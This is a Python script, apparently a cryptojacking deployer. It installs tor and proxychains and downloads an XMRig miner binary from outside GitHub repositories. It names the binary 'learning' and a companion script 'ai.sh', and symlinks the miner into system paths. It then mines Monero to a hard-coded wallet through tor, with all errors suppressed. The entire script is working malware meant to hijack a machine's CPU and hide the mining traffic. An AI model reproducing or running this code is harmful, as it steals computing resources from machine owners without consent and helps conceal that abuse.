__author__ = 'root'
import time
import os, sys
import multiprocessing

useproxy = 0
os.system('chmod 777 ' + __file__)
program = 'learning'
shell = 'ai.sh'
os.system('pkill ' + program)
cores = multiprocessing.cpu_count() - 1
if cores <= 0:
    cores = 1
os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')

try:
    os.system('apt-get update -y')
    os.system('apt-get install -y gcc make tor python3 python3-dev')
    os.system('rm -rf proxychains-ng')
    os.system('git clone https://github.com/ts6aud5vkg/proxychains-ng.git')
    os.chdir('proxychains-ng')
    os.system('make')
    os.system('make install')
    os.system('make install-config')
    if not os.path.isfile('/usr/local/bin/' + program):
        os.system('wget  -qO- https://raw.githubusercontent.com/ToRxmrig/container--1hp8ak/main/'  + shell)
        os.system('wget https://github.com/ts6aud5vkg/daovps/raw/master/xmrig_tls/' + program)
        os.system('chmod 777 ' + program)
        workingdir = os.getcwd()
        os.system('ln -s -f ' + workingdir + '/' + program + ' ' + '/usr/local/bin/' + program)
        os.system('ln -s -f ' + workingdir + '/' + program + ' ' + '/usr/bin/' + program)
        time.sleep(2)
except:
    pass

os.system('tor &')
time.sleep(60)
os.system('proxychains4 ' + program + ' --donate-level 1 -o xmr-us-west1.nanopool.org:14433 -u 4BK5ZPJGLpSdC2Pk3FH7iGaB5uBEDj76pYpSC4qaRBGKEHzcs8vDJSvB6WfWz7efiURtQERFUtEs6A3joiMF3EnHEpo2eNY -p az -a rx/0 -k --tls -t ' + str(cores))
